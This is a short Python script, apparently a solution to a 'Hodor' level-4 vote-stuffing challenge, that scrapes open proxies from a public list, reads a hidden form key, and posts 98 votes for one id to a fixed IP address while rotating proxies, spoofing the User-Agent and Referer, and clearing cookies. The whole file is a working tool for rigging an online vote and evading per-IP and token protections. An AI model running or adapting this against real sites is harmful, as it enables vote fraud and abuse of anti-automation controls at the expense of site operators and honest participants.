#!/usr/bin/python3
import sys
import requests
from bs4 import BeautifulSoup
from lxml.html import fromstring
from itertools import cycle

def get_proxies():

    url = 'https://www.us-proxy.org'
    response = requests.get(url)
    parser = fromstring(response.text)
    proxies = set()
    for i in parser.xpath('//tbody/tr'):
        if i.xpath('.//td[7][contains(text(),"yes")]'):
            # Grabbing IP and corresponding PORT
            proxy = ":".join([i.xpath('.//td[1]/text()')[0],
                              i.xpath('.//td[2]/text()')[0]])
            proxies.add(proxy)

    return proxies



repeat = 0

proxies = get_proxies()
proxy_pool = cycle(proxies)
url = "http://158.69.76.135/level4.php"
id = 2835
i = 1
head = {'Referer': url, 'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64;\
 x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141\
 Safari/537.36 Edg/87.0.664.75"}



while repeat < 98:
    print("vote:{}".format(repeat))
    
    proxy = next(proxy_pool)
    print("Request #%d"%i)
    try:
        print(proxy)
        s = requests.session()

        r = s.get(url)
        doc = r.content

        soup = BeautifulSoup(doc, 'html.parser')

        key = soup.find("input", {"name": "key"})
        key_value = key.get("value")

        s.proxies = {"http": "http://" + proxy, "https": "http://" + proxy}
        result = s.post(url, headers=head,
                        data={"id": id, "holdthedoor": 1, "key": key_value}, timeout=5)
        repeat += 1
        i += 1
        s.cookies.clear()
        
    except:
        i += 1
        s.cookies.clear()
        print("fail\n")
